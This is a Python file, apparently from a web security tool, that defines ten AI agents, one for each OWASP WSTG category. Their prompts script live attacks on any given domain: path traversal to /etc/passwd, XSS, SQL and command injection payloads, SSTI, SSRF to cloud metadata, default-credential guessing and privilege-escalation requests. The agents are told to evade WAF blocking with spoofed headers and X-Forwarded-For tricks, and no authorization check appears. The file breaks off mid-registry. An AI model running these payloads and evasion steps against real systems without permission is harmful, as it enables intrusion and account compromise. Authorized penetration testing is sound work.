"""CF_AI — 10 specialized WSTG agents, one per test category.

Each agent runs ONLY the checked tests for its category.
All use generic_linux_command for real execution — no hardcoded results.
"""
from __future__ import annotations
import os
from sdk.agents import Agent
from tools.generic_linux_command import generic_linux_command, read_file, write_file

_TOOLS = [generic_linux_command, read_file, write_file]
_MODEL = os.environ.get('CAI_MODEL', 'gpt-4o')

RULES = """
RULES:
- Execute every check with generic_linux_command using real commands.
- Never fabricate findings — only report what actual command output shows.
- If a tool is missing, substitute: curl / nmap / python3 one-liners.
- Always add -4 --connect-timeout 8 to curl (forces IPv4, avoids 120s IPv6 hang).
- Add -Pn to nmap if host appears down. Use --max-time on curl.
- If curl returns no output or exit code 28, immediately retry with:
    -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    -H "Referer: https://www.google.com/"
  Then try X-Forwarded-For: 127.0.0.1 bypass. Then fall back to passive recon.
- After all checks output: FINDING | WSTG-ID | Severity | Evidence
"""


def _agent(category: str, desc: str, instructions: str) -> Agent:
    return Agent(
        name=f'WSTG-{category}',
        description=desc,
        instructions=RULES + instructions,
        tools=_TOOLS,
        model=_MODEL,
        max_turns=25,
    )


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-INFO  (INFO-02, 06, 07, 08, 09, 10)
# ─────────────────────────────────────────────────────────────────────────────
INFO_AGENT = _agent('INFO', 'Information Gathering', """
You are the WSTG-INFO agent. Target: {domain}

IMPORTANT — FIREWALL/WAF STRATEGY:
If direct curl/HTTP returns no output or times out, the target is blocking the VPS IP.
Switch immediately to:
  1. Passive recon (whois, DNS, crt.sh, Wayback Machine — no HTTP needed)
  2. Browser-spoofed curl (-A with real UA + Referer header)
  3. X-Forwarded-For bypass headers
  4. whatweb / wafw00f (use their own bypass modes)
Never give up after one failure — try all fallbacks before reporting blocked.

─── STEP 0 — PASSIVE RECON (always run first, works through any firewall) ───

  whois {domain} 2>/dev/null | grep -iE "registrar|registrant|name server|created|expires|admin|tech|org" | head -20
  dig {domain} ANY +short 2>/dev/null | head -20
  dig {domain} MX +short 2>/dev/null
  dig {domain} TXT +short 2>/dev/null | head -10
  host {domain} 2>/dev/null

  # Certificate transparency — reveals subdomains and server info without HTTP
  curl -s "https://crt.sh/?q={domain}&output=json" --max-time 15 2>/dev/null \
    | python3 -c "
import sys,json
try:
  d=json.load(sys.stdin)
  subs=sorted(set(e['name_value'].replace('*.','') for e in d if '{domain}' in e.get('name_value','')))
  [print(s) for s in subs[:30]]
except Exception as e: print(e)"

  # Wayback Machine CDX — historical URLs cached without live connection
  curl -s "http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&limit=25&fl=original,statuscode,mimetype&collapse=urlkey" --max-time 15 2>/dev/null \
    | python3 -c "
import sys,json
try:
  rows=json.load(sys.stdin)[1:]
  [print(r[1],r[2],r[0]) for r in rows]
except: pass"

  # HackerTarget passive DNS
  curl -s "https://api.hackertarget.com/hostsearch/?q={domain}" --max-time 10 2>/dev/null | head -20

─── STEP 1 — DIRECT HTTP (try these in order, stop when one works) ───

  # Attempt A: plain curl with -4 and short timeout
  curl -4 -sI https://{domain}/ --max-time 10

  # Attempt B: browser-spoofed (bypasses basic bot/IP blocking)
  curl -4 -sI https://{domain}/ --max-time 10 \
    -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" \
    -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
    -H "Accept-Language: en-US,en;q=0.5" \
    -H "Referer: https://www.google.com/"

  # Attempt C: X-Forwarded-For bypass (some WAFs whitelist localhost/trusted IPs)
  curl -4 -sI https://{domain}/ --max-time 10 \
    -H "X-Forwarded-For: 127.0.0.1" \
    -H "X-Real-IP: 127.0.0.1" \
    -H "X-Originating-IP: 127.0.0.1" \
    -H "X-Remote-IP: 127.0.0.1"

  # Attempt D: try HTTP (port 80) if HTTPS is blocked
  curl -4 -sI http://{domain}/ --max-time 10

  # Attempt E: whatweb — has its own UA and fingerprinting bypass
  whatweb -a 3 --colour=never https://{domain}/ 2>/dev/null | head -20 \
    || whatweb -a 1 --colour=never http://{domain}/ 2>/dev/null | head -20

[INFO-02] Fingerprint Web Server
  # Collect server header from whichever attempt above worked
  # Also try nmap NSE script (works even when HTTP is firewalled)
  nmap -Pn -sV -p 80,443 --script http-server-header,http-headers {domain} 2>/dev/null | head -30
  wafw00f https://{domain}/ 2>/dev/null | head -15 || true

[INFO-06] Application Entry Points
  # robots.txt / sitemap — try browser UA if plain curl fails
  curl -4 -s https://{domain}/robots.txt --max-time 10 \
    -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
  curl -4 -s https://{domain}/sitemap.xml --max-time 10 \
    -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" \
    | grep -o '<loc>[^<]*' | head -20
  # Use Wayback Machine paths as fallback entry-point map (already fetched above)
  gobuster dir -u https://{domain} -w /usr/share/wordlists/dirb/common.txt -q -t 10 --timeout 8s \
    -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" 2>/dev/null | head -30 || true

[INFO-07] Map Execution Paths
  curl -4 -s https://{domain}/ --max-time 15 \
    -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" \
    -H "Referer: https://www.google.com/" \
    | grep -Eo '(href|src|action)="[^"#]*"' | sort -u | head -40

[INFO-08] Fingerprint Framework
  curl -4 -sI https://{domain}/ --max-time 10 \
    -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" \
    | grep -iE "x-powered-by|x-generator|x-drupal|x-wordpress|cf-ray|x-shopify|server"
  curl -4 -s https://{domain}/ --max-time 15 \
    -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" \
    | grep -iEo "(wp-content|wp-includes|drupal|joomla|shopify|magento|laravel|django|next\\.js|gatsby|wix|squarespace)" | sort -u | head -10

[INFO-09] Fingerprint Web Application
  curl -4 -s https://{domain}/ --max-time 15 \
    -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" \
    | grep -iEo "<meta[^>]+generator[^>]+>" | head -5
  curl -4 -s https://{domain}/ --max-time 15 \
    -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" \
    | grep -iEo "(jquery|bootstrap|angular|react|vue|nuxt|next)[/-][0-9.]+" | sort -u | head -10

[INFO-10] Map Application Architecture
  nmap -Pn -sV -p 80,443,8080,8443,3000,4000,5000,9000 {domain} 2>/dev/null | head -30
  curl -4 -sI https://{domain}/ --max-time 10 \
    -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" \
    | grep -iE "via|x-cache|cf-ray|x-amz|x-varnish|fastly|akamai|cloudflare"

After all checks, list:
FINDING | WSTG-INFO-XX | Severity (Info/Low/Medium/High) | Evidence
""")


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-CONF  (CONF-01, 10)
# ─────────────────────────────────────────────────────────────────────────────
CONF_AGENT = _agent('CONF', 'Configuration & Deploy Management', """
You are the WSTG-CONF agent. Run these 2 checks on {domain}:

[CONF-01] Test Network Infrastructure Configuration
  nmap -Pn --script ssl-cert,ssl-enum-ciphers -p 443 {domain} 2>/dev/null | head -40
  curl -sk https://{domain}/.well-known/security.txt --max-time 10
  curl -sI https://{domain}/ --max-time 10 | grep -iE "strict-transport-security|x-frame-options|x-content-type|content-security-policy|x-xss-protection"

[CONF-10] Test for Subdomain Takeover
  subfinder -d {domain} -silent 2>/dev/null | head -30 \
    || curl -s "https://crt.sh/?q=%.{domain}&output=json" --max-time 15 2>/dev/null \
       | python3 -c "
import sys,json
try:
  d=json.load(sys.stdin)
  subs=sorted(set(e['name_value'].replace('*.','') for e in d))
  [print(s) for s in subs[:25]]
except:pass"
  amass enum -passive -d {domain} 2>/dev/null | head -20 || true

After all checks, list:
FINDING | WSTG-CONF-XX | Severity | Evidence
""")


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-IDNT  (IDNT-01 to 05)
# ─────────────────────────────────────────────────────────────────────────────
IDNT_AGENT = _agent('IDNT', 'Identity Management', """
You are the WSTG-IDNT agent. Run these 5 checks on {domain}:

[IDNT-01] Test Role Definitions
  curl -s https://{domain}/ --max-time 15 | grep -iEo "(admin|moderator|editor|viewer|role|privilege|superuser|staff)" | sort -u
  for p in /admin /dashboard /moderator /staff /manager; do
    code=$(curl -so /dev/null -w "%{http_code}" https://{domain}$p --max-time 6 2>/dev/null)
    echo "$code $p"
  done

[IDNT-02] Test User Registration Process
  for p in /register /signup /join /create-account /new-user; do
    code=$(curl -so /dev/null -w "%{http_code}" https://{domain}$p --max-time 6 2>/dev/null)
    echo "$code $p"
  done
  curl -si https://{domain}/register --max-time 10 2>/dev/null | grep -iE "email|username|password|confirm" | head -10

[IDNT-03] Test Account Provisioning
  curl -si -X POST https://{domain}/register \
    -d "username=cfai_test99&email=cfai_test99@mailinator.com&password=CfaiTest1234!" \
    -H "Content-Type: application/x-www-form-urlencoded" --max-time 12 2>/dev/null | head -20

[IDNT-04] Account Enumeration
  for u in admin administrator root test user info support webmaster; do
    code=$(curl -so /dev/null -w "%{http_code}" https://{domain}/user/$u --max-time 6 2>/dev/null)
    echo "$code /user/$u"
  done
  curl -si -X POST https://{domain}/login \
    -d "username=admin@{domain}&password=wrongpass" \
    -H "Content-Type: application/x-www-form-urlencoded" --max-time 10 2>/dev/null | grep -iE "user|exist|found|invalid|error" | head -5

[IDNT-05] Weak or Unenforced Username Policy
  for user in a "" "user name" "a@b" "$(python3 -c "print('x'*300)")"; do
    curl -si -X POST https://{domain}/register \
      -d "username=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$user'))")&email=t@t.com&password=Test1234!" \
      -H "Content-Type: application/x-www-form-urlencoded" --max-time 8 2>/dev/null \
      | grep -iE "username|error|invalid|length|policy" | head -3
  done

After all checks, list:
FINDING | WSTG-IDNT-XX | Severity | Evidence
""")


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-ATHN  (ATHN-01,02,03,04,07,08,09,10,11)
# ─────────────────────────────────────────────────────────────────────────────
ATHN_AGENT = _agent('ATHN', 'Authentication Testing', """
You are the WSTG-ATHN agent. Run these 9 checks on {domain}:

[ATHN-01] Credentials over Encrypted Channel
  code=$(curl -so /dev/null -w "%{http_code}" http://{domain}/login --max-time 10 2>/dev/null)
  loc=$(curl -sI http://{domain}/login --max-time 10 2>/dev/null | grep -i location)
  echo "HTTP login: $code $loc"
  curl -sI https://{domain}/login --max-time 10 2>/dev/null | grep -iE "strict-transport-security"

[ATHN-02] Default Credentials
  for cred in "admin:admin" "admin:password" "admin:123456" "root:root" "test:test" "admin:admin123" "administrator:administrator"; do
    u="${cred%%:*}"; p="${cred##*:}"
    code=$(curl -so /dev/null -w "%{http_code}" -L -X POST https://{domain}/login \
      -d "username=$u&password=$p" -H "Content-Type: application/x-www-form-urlencoded" --max-time 8 2>/dev/null)
    echo "$code  $cred"
  done

[ATHN-03] Weak Lock Out Mechanism
  for i in $(seq 1 8); do
    code=$(curl -so /dev/null -w "%{http_code}" -X POST https://{domain}/login \
      -d "username=admin@{domain}&password=wrongpass$i" \
      -H "Content-Type: application/x-www-form-urlencoded" --max-time 8 2>/dev/null)
    echo "Attempt $i: HTTP $code"
  done

[ATHN-04] Bypassing Authentication Schema
  curl -si https://{domain}/admin/ -H "X-Forwarded-For: 127.0.0.1" --max-time 8 2>/dev/null | head -5
  curl -si https://{domain}/admin -H "X-Original-URL: /" --max-time 8 2>/dev/null | head -5
  curl -si "https://{domain}/login?next=/admin&admin=true" --max-time 8 2>/dev/null | head -5

[ATHN-07] Weak Password Policy
  for pass in "1" "123" "password" "abc" "1234567890123456789012345678901234567890"; do
    curl -si -X POST https://{domain}/register \
      -d "username=poltest&email=pol@mailinator.com&password=$pass" \
      -H "Content-Type: application/x-www-form-urlencoded" --max-time 8 2>/dev/null \
      | grep -iE "password|weak|policy|error|invalid|length" | head -2
  done

[ATHN-08] Weak Security Question/Answer
  for p in /forgot-password /password-hint /security-question /recover; do
    code=$(curl -so /dev/null -w "%{http_code}" https://{domain}$p --max-time 6 2>/dev/null)
    [ "$code" != "404" ] && [ "$code" != "000" ] && echo "$code $p"
  done

[ATHN-09] Weak Password Reset
  curl -si -X POST https://{domain}/forgot-password \
    -d "email=admin@{domain}" \
    -H "Content-Type: application/x-www-form-urlencoded" --max-time 12 2>/dev/null | head -20
  curl -si -X POST https://{domain}/reset-password \
    -d "token=123456&password=newpass" \
    -H "Content-Type: application/x-www-form-urlencoded" --max-time 10 2>/dev/null | head -10

[ATHN-10] Weaker Authentication in Alternative Channel
  for ep in /api/login /api/v1/login /api/v2/login /api/auth /mobile/login /m/login; do
    code=$(curl -so /dev/null -w "%{http_code}" -X POST https://{domain}$ep \
      -H "Content-Type: application/json" \
      -d '{"username":"admin","password":"admin"}' --max-time 8 2>/dev/null)
    [ "$code" != "404" ] && [ "$code" != "000" ] && echo "$code $ep"
  done

[ATHN-11] Multi-Factor Authentication
  curl -s https://{domain}/login --max-time 15 2>/dev/null \
    | grep -iE "(2fa|mfa|otp|totp|authenticator|two.factor|verification.code|sms.code)" | head -5

After all checks, list:
FINDING | WSTG-ATHN-XX | Severity | Evidence
""")


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-ATHZ  (ATHZ-01 to 05)
# ─────────────────────────────────────────────────────────────────────────────
ATHZ_AGENT = _agent('ATHZ', 'Authorization Testing', """
You are the WSTG-ATHZ agent. Run these 5 checks on {domain}:

[ATHZ-01] Directory Traversal / File Include
  python3 -c "
import urllib.request,urllib.error,urllib.parse
payloads=['/../../../etc/passwd','/%2e%2e/%2e%2e/etc/passwd','/..%2f..%2fetc%2fpasswd','/?file=../../etc/passwd','/?path=../etc/passwd','/?page=../../../../etc/passwd']
for p in payloads:
    try:
        r=urllib.request.urlopen('https://{domain}'+p,timeout=8)
        body=r.read(200).decode('utf-8','ignore')
        if 'root:' in body or '/bin/' in body:print('PATH TRAVERSAL HIT:',p)
        else:print(r.status,p)
    except urllib.error.HTTPError as e:print(e.code,p)
    except Exception as e:print('ERR',str(e)[:40],p)
"

[ATHZ-02] Bypassing Authorization Schema
  curl -si https://{domain}/api/users --max-time 8 2>/dev/null | head -10
  curl -si https://{domain}/api/admin --max-time 8 2>/dev/null | head -10
  curl -si https://{domain}/admin/ --max-time 8 2>/dev/null | head -5
  curl -si https://{domain}/admin/ -H "X-Forwarded-For: 127.0.0.1" --max-time 8 2>/dev/null | head -5

[ATHZ-03] Privilege Escalation
  curl -si -X POST https://{domain}/api/user/update \
    -H "Content-Type: application/json" \
    -d '{"role":"admin","is_admin":true,"privilege":"superuser"}' --max-time 10 2>/dev/null | head -10
  curl -si -X PUT https://{domain}/api/user/1 \
    -H "Content-Type: application/json" \
    -d '{"role":"admin"}' --max-time 10 2>/dev/null | head -10

[ATHZ-04] Insecure Direct Object Reference (IDOR)
  python3 -c "
import urllib.request,urllib.error
paths=['/api/user/','/api/order/','/api/account/','/api/invoice/','/user/profile/','/order/','/account/']
for path in paths:
    for i in ['1','2','3','100','9999']:
        try:
            r=urllib.request.urlopen('https://{domain}'+path+i,timeout=6)
            print(r.status,path+i)
        except urllib.error.HTTPError as e:
            if e.code not in(404,405):print(e.code,path+i)
        except:pass
"

[ATHZ-05] OAuth Weaknesses
  curl -s https://{domain}/ --max-time 15 2>/dev/null \
    | grep -iEo "(oauth|openid|auth0|okta|google.*login|facebook.*login|/.well-known/openid-configuration)" | sort -u
  for p in /.well-known/openid-configuration /oauth/authorize /oauth/token /auth/google /auth/facebook /auth/github; do
    code=$(curl -so /dev/null -w "%{http_code}" https://{domain}$p --max-time 6 2>/dev/null)
    [ "$code" != "404" ] && [ "$code" != "000" ] && echo "$code $p"
  done

After all checks, list:
FINDING | WSTG-ATHZ-XX | Severity | Evidence
""")


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-SESS  (SESS-01,02,03,05,06,07,10)
# ─────────────────────────────────────────────────────────────────────────────
SESS_AGENT = _agent('SESS', 'Session Management Testing', """
You are the WSTG-SESS agent. Run these 7 checks on {domain}:

[SESS-01] Session Management Schema
  curl -sc /tmp/cfai_sess.txt -so /dev/null https://{domain}/ --max-time 12 2>/dev/null
  grep -v "^#\\|^$" /tmp/cfai_sess.txt 2>/dev/null || echo "No cookies"

[SESS-02] Cookie Attributes
  curl -sI https://{domain}/ --max-time 12 2>/dev/null | grep -i "set-cookie"
  curl -sI https://{domain}/login --max-time 12 2>/dev/null | grep -i "set-cookie"
  curl -sI https://{domain}/account --max-time 12 2>/dev/null | grep -i "set-cookie"

[SESS-03] Session Fixation
  pre=$(curl -sc /tmp/sess_pre.txt -so /dev/null https://{domain}/ --max-time 12 && grep -v "^#\\|^$" /tmp/sess_pre.txt 2>/dev/null | awk '{print $NF}' | head -1)
  echo "Session token before login: $pre"

[SESS-05] Cross Site Request Forgery (CSRF)
  curl -s https://{domain}/ --max-time 15 2>/dev/null \
    | grep -iE "(csrf|_token|authenticity_token|__RequestVerificationToken|X-CSRF)" | head -5
  curl -s https://{domain}/login --max-time 15 2>/dev/null \
    | grep -iE "csrf|_token|nonce" | head -5
  curl -sI https://{domain}/ --max-time 10 2>/dev/null | grep -iE "samesite"

[SESS-06] Logout Functionality
  for p in /logout /signout /sign-out /api/logout /user/logout /account/logout; do
    code=$(curl -so /dev/null -w "%{http_code}" https://{domain}$p --max-time 6 2>/dev/null)
    [ "$code" != "000" ] && echo "$code $p"
  done

[SESS-07] Session Timeout
  curl -sI https://{domain}/ --max-time 10 2>/dev/null | grep -iE "cache-control|pragma|expires|max-age"
  curl -s https://{domain}/ --max-time 15 2>/dev/null | grep -iE "(session.timeout|idle.timeout|auto.logout|inactivity)" | head -5

[SESS-10] JSON Web Tokens (JWT)
  curl -s https://{domain}/ --max-time 15 2>/dev/null \
    | grep -Eo "eyJ[a-zA-Z0-9_-]+\\.[a-zA-Z0-9_-]+\\.[a-zA-Z0-9_-]+" | head -3
  for ep in /api /api/v1 /api/auth /api/token; do
    curl -sI https://{domain}$ep --max-time 8 2>/dev/null | grep -iE "authorization|bearer|jwt" | head -2
  done

After all checks, list:
FINDING | WSTG-SESS-XX | Severity | Evidence
""")


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-INPV  (INPV-01,02,05,11,12,18,19)
# ─────────────────────────────────────────────────────────────────────────────
INPV_AGENT = _agent('INPV', 'Input Validation Testing', """
You are the WSTG-INPV agent. Run these 7 checks on {domain}:

[INPV-01] Reflected XSS
  python3 -c "
import urllib.request,urllib.error,urllib.parse
payloads=['<script>alert(1)</script>',\"'\\\"><img src=x onerror=alert(1)>\",'<svg onload=alert(1)>']
params=['q','search','s','query','keyword','name','input','term','msg']
for param in params:
    for p in payloads:
        url='https://{domain}/?'+param+'='+urllib.parse.quote(p)
        try:
            r=urllib.request.urlopen(url,timeout=8)
            body=r.read(5000).decode('utf-8','ignore')
            if p in body or 'alert(1)' in body:print('REFLECTED XSS:',url)
            else:print(r.status,param)
        except urllib.error.HTTPError as e:
            if e.code==500:print('500',param)
        except:pass
"

[INPV-02] Stored XSS
  for ep in /comment /review /contact /feedback /post /message /guestbook /forum; do
    code=$(curl -so /dev/null -w "%{http_code}" -X POST "https://{domain}$ep" \
      -d "comment=<script>alert(xss_test)</script>&name=tester&email=t@mailinator.com" \
      -H "Content-Type: application/x-www-form-urlencoded" --max-time 8 2>/dev/null)
    [ "$code" != "404" ] && [ "$code" != "000" ] && echo "$code POST $ep"
  done

[INPV-05] SQL Injection
  sqlmap -u "https://{domain}/?id=1" --batch --level=1 --risk=1 --timeout=20 \
    --output-dir=/tmp/sqli_{domain} 2>/dev/null | tail -15 \
  || python3 -c "
import urllib.request,urllib.error,urllib.parse
errors=['sql syntax','mysql error','ora-0','sqlite_','pg_query','postgresql error','syntax error near','unclosed quotation']
payloads=[\"'\",\"' OR '1'='1\",\"1; SELECT 1--\",\"' AND SLEEP(2)--\",\"1' ORDER BY 1--\"]
params=['id','cat','page','product','item','user','order','ref','pid','cid']
for param in params:
    for p in payloads:
        url='https://{domain}/?'+param+'='+urllib.parse.quote(p)
        try:
            r=urllib.request.urlopen(url,timeout=10)
            body=r.read(3000).decode('utf-8','ignore').lower()
            if any(e in body for e in errors):print('SQL ERROR:',url)
        except urllib.error.HTTPError as e:
            if e.code==500:print('500 possible SQLi:',url)
        except:pass
"

[INPV-11] Code Injection
  python3 -c "
import urllib.request,urllib.error,urllib.parse
payloads=['phpinfo()','system(id)','exec(whoami)','passthru(id)']
params=['page','template','include','module','file','action','view']
for param in params:
    for p in payloads:
        url='https://{domain}/?'+param+'='+urllib.parse.quote(p)
        try:
            r=urllib.request.urlopen(url,timeout=8)
            body=r.read(2000).decode('utf-8','ignore')
            if any(x in body for x in ['uid=','PHP Version','phpinfo','root:','www-data']):
                print('CODE INJECTION:',url)
        except:pass
"

[INPV-12] Command Injection
  python3 -c "
import urllib.request,urllib.error,urllib.parse,time
payloads=['; id','| id','`id`','; whoami','& whoami','; sleep 3','| sleep 3']
params=['ip','host','cmd','exec','command','ping','domain','target']
for param in params:
    for p in payloads:
        url='https://{domain}/?'+param+'='+urllib.parse.quote(p)
        t0=time.time()
        try:
            r=urllib.request.urlopen(url,timeout=10)
            body=r.read(500).decode('utf-8','ignore')
            elapsed=time.time()-t0
            if 'uid=' in body or 'root' in body:print('CMD INJECTION:',url)
            elif elapsed>2.5 and 'sleep' in p:print('CMD INJECTION (time-based):',url)
        except:pass
"

[INPV-18] Server-Side Template Injection (SSTI)
  python3 -c "
import urllib.request,urllib.error,urllib.parse
payloads=['{{7*7}}','\\${7*7}','#{7*7}','<%= 7*7 %>','{{7*\"7\"}}']
params=['name','template','greeting','msg','text','q','search']
for param in params:
    for p in payloads:
        url='https://{domain}/?'+param+'='+urllib.parse.quote(p)
        try:
            r=urllib.request.urlopen(url,timeout=8)
            body=r.read(2000).decode('utf-8','ignore')
            if '49' in body:print('SSTI HIT (7*7=49):',url,'payload:',p)
            else:print(r.status,param,'=',p)
        except:pass
"

[INPV-19] Server-Side Request Forgery (SSRF)
  python3 -c "
import urllib.request,urllib.error,urllib.parse
params=['url','path','redirect','uri','dest','target','src','source','endpoint','callback','webhook','link','fetch','load','proxy']
for param in params:
    for dst in ['http://169.254.169.254/latest/meta-data/','http://127.0.0.1/','http://localhost/']:
        url='https://{domain}/?'+param+'='+urllib.parse.quote(dst)
        try:
            r=urllib.request.urlopen(url,timeout=8)
            body=r.read(200).decode('utf-8','ignore')
            if any(x in body for x in ['ami-id','instance-id','local-ipv4','127.0.0.1','localhost']):
                print('SSRF HIT:',url)
            else:
                print(r.status,param,'->',dst[:30])
        except urllib.error.HTTPError as e:print(e.code,param)
        except:pass
"

After all checks, list:
FINDING | WSTG-INPV-XX | Severity | Evidence
""")


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-CRYP  (CRYP-01, 03)
# ─────────────────────────────────────────────────────────────────────────────
CRYP_AGENT = _agent('CRYP', 'Cryptography Testing', """
You are the WSTG-CRYP agent. Run these 2 checks on {domain}:

[CRYP-01] Weak Transport Layer Security
  nmap -Pn --script ssl-enum-ciphers -p 443 {domain} 2>/dev/null \
    | grep -E "TLS|SSL|cipher|WEAK|WARN|ERROR|least strength|NULL|EXPORT|RC4|DES|MD5"
  curl -sI https://{domain}/ --max-time 10 2>/dev/null | grep -iE "strict-transport-security"
  openssl s_client -connect {domain}:443 -tls1 2>/dev/null | grep -E "Cipher|Protocol|Verify" | head -10 || \
    openssl s_client -connect {domain}:443 </dev/null 2>/dev/null | grep -E "Protocol|Cipher|subject|issuer|expires" | head -15

[CRYP-03] Sensitive Info over Unencrypted Channels
  code=$(curl -so /dev/null -w "%{http_code}" http://{domain}/ --max-time 12 2>/dev/null)
  loc=$(curl -sI http://{domain}/ --max-time 12 2>/dev/null | grep -i "^location:")
  echo "HTTP: $code  $loc"
  curl -sI https://{domain}/ --max-time 10 2>/dev/null | grep -iE "strict-transport-security|hsts|includeSubDomains|preload"
  # Check if login form submits over HTTP
  curl -s http://{domain}/login --max-time 10 2>/dev/null | grep -iE "(action=.http:|method=.post)" | head -3

After all checks, list:
FINDING | WSTG-CRYP-XX | Severity | Evidence
""")


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-CLNT  (CLNT-01,02,03,04,12,13)
# ─────────────────────────────────────────────────────────────────────────────
CLNT_AGENT = _agent('CLNT', 'Client-Side Testing', """
You are the WSTG-CLNT agent. Run these 6 checks on {domain}:

[CLNT-01] DOM-Based XSS
  curl -s https://{domain}/ --max-time 15 2>/dev/null \
    | grep -iE "(document\\.write\\s*\\(|innerHTML\\s*=|outerHTML\\s*=|eval\\s*\\(|location\\.hash|location\\.search|document\\.URL|document\\.referrer)" | head -15

[CLNT-02] JavaScript Execution
  curl -s https://{domain}/ --max-time 15 2>/dev/null | grep -Eo 'src=\"[^\"]*\\.js[^\"]*\"' | head -15
  curl -s https://{domain}/ --max-time 15 2>/dev/null \
    | grep -iE "(eval\\s*\\(|setTimeout\\s*\\(|setInterval\\s*\\(|new\\s+Function\\s*\\(|Function\\s*\\()" | head -8

[CLNT-03] HTML Injection
  python3 -c "
import urllib.request,urllib.error,urllib.parse
marker='<h1>cfai_html_test_12345</h1>'
params=['name','q','search','msg','text','input','greeting','title']
for param in params:
    url='https://{domain}/?'+param+'='+urllib.parse.quote(marker)
    try:
        r=urllib.request.urlopen(url,timeout=8)
        body=r.read(8000).decode('utf-8','ignore')
        if marker in body:print('HTML INJECTION reflected:',url)
        else:print(r.status,param)
    except:pass
"

[CLNT-04] Client-Side URL Redirect
  python3 -c "
import urllib.request,urllib.error,urllib.parse
params=['redirect','url','next','return','dest','goto','redir','target','continue','forward','back','r','to','returnUrl','returnURL']
for param in params:
    url='https://{domain}/?'+param+'='+urllib.parse.quote('https://evil-test.example.com')
    try:
        r=urllib.request.urlopen(url,timeout=8)
        final=r.geturl()
        if 'evil-test.example.com' in final:print('OPEN REDIRECT:',url,'->',final)
        else:print(r.status,param)
    except urllib.error.HTTPError as e:print(e.code,param)
    except:pass
"

[CLNT-12] Browser Storage
  curl -s https://{domain}/ --max-time 15 2>/dev/null \
    | grep -iE "(localStorage\\.(setItem|getItem)|sessionStorage\\.(setItem|getItem)|indexedDB\\.open|document\\.cookie\\s*=)" | head -10

[CLNT-13] Cross-Site Script Inclusion
  curl -s https://{domain}/ --max-time 15 2>/dev/null \
    | grep -Eo 'src=\"https?://[^\"]*\\.js[^\"]*\"' | head -15
  # Check for JSONP endpoints
  for ep in /api/jsonp /callback /json /data; do
    code=$(curl -so /dev/null -w "%{http_code}" "https://{domain}$ep?callback=test" --max-time 6 2>/dev/null)
    [ "$code" != "404" ] && echo "$code JSONP? $ep?callback=test"
  done

After all checks, list:
FINDING | WSTG-CLNT-XX | Severity | Evidence
""")


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-APIT  (APIT-01, 02, 99)
# ─────────────────────────────────────────────────────────────────────────────
APIT_AGENT = _agent('APIT', 'API Security Testing', """
You are the WSTG-APIT agent. Run these 3 checks on {domain}:

[APIT-01] API Reconnaissance
  for ep in /api /api/v1 /api/v2 /api/v3 /v1 /v2 /rest /swagger.json /openapi.json /api-docs /swagger-ui.html /redoc /.well-known; do
    code=$(curl -so /dev/null -w "%{http_code}" https://{domain}$ep --max-time 8 2>/dev/null)
    [ "$code" != "404" ] && [ "$code" != "000" ] && echo "$code https://{domain}$ep"
  done
  # Check for API versioning and methods
  curl -sI https://{domain}/api/v1 --max-time 8 2>/dev/null | grep -iE "allow|content-type|access-control"

[APIT-02] Broken Object Level Authorization (BOLA/IDOR)
  python3 -c "
import urllib.request,urllib.error
paths=['/api/user/','/api/v1/user/','/api/order/','/api/v1/order/','/api/account/','/api/invoice/','/api/document/','/api/file/']
ids=['1','2','3','100','9999','0','admin']
for path in paths:
    for i in ids:
        try:
            r=urllib.request.urlopen('https://{domain}'+path+i,timeout=6)
            print(r.status,path+i)
        except urllib.error.HTTPError as e:
            if e.code not in(404,405,410):print(e.code,path+i)
        except:pass
"

[APIT-99] GraphQL Security
  for ep in /graphql /api/graphql /gql /graph /graphql/v1; do
    code=$(curl -so /dev/null -w "%{http_code}" -X POST "https://{domain}$ep" \
      -H "Content-Type: application/json" \
      -d '{"query":"{__typename}"}' --max-time 8 2>/dev/null)
    if [ "$code" != "404" ] && [ "$code" != "000" ]; then
      echo "GraphQL: $code https://{domain}$ep"
      # Introspection
      curl -s -X POST "https://{domain}$ep" \
        -H "Content-Type: application/json" \
        -d '{"query":"{__schema{types{name}}}"}' --max-time 10 2>/dev/null | python3 -m json.tool 2>/dev/null | head -20
    fi
  done
  command -v graphql-cop &>/dev/null && graphql-cop -t https://{domain}/graphql 2>/dev/null | head -30 || true

After all checks, list:
FINDING | WSTG-APIT-XX | Severity | Evidence
""")


# ── Registry ──────────────────────────────────────────────────────────────────

WSTG_REGISTRY: dict[str, Agent] = {
    'info': INFO_AGENT,
    'conf': CONF_AGENT,
    'idnt': IDNT_AGENT,
